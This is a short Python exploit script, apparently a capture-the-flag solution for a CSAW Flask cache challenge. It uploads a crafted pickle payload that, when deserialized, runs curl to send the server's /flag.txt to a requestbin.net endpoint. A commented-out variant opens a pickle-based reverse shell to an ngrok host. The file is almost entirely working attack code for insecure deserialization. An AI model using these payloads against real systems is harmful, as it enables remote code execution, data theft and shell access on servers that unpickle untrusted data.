import requests
import pickle
from io import BytesIO
from utils.ctf.rev_shell import pickle_rev_shell, PickleRCE
#URL = "http://localhost:5000/"
URL = "http://web.chal.csaw.io:5000/"
title = "flask_cache_view//test5"
content = BytesIO(
	b"!" + pickle.dumps(PickleRCE('curl -d "x=$(cat /flag.txt)" http://requestbin.net/r/1cwj5z21'))
)
#content = BytesIO(b"!" + pickle_rev_shell("2.tcp.ngrok.io", 10343, typ="curl", protocol=3))
print(requests.post(URL, data={"title": title}, files={"content": content}).text)
print(requests.get(URL + "test5").text)
